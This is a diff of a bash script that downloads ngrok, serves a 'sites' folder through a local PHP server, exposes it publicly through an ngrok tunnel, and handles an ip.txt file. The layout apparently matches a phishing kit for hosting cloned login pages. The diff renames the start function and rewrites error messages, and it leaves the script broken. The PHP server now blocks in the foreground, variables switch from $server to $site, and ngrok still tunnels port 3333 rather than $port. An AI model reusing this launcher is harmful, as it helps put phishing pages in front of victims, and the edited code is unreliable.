@@ -1,4 +1,4 @@
-start() {
+start_server() {
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
 
@@ -24,7 +24,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "${red}CRITICAL ERROR! ABORTING! (Err: UNABLE TO DOWNLOAD Ngrok)${reset} \n"
 exit 1
 fi
 
@@ -37,14 +37,14 @@ unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "${red}CRITICAL ERROR! ABORTING! (Err: UNABLE TO DOWNLOAD Ngrok)${reset} \n"
 exit 1
 fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+printf "${green}Starting Personal Home Page (PHP)...${reset} \n"
+cd sites/$site && php -S 127.0.0.1:$port
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
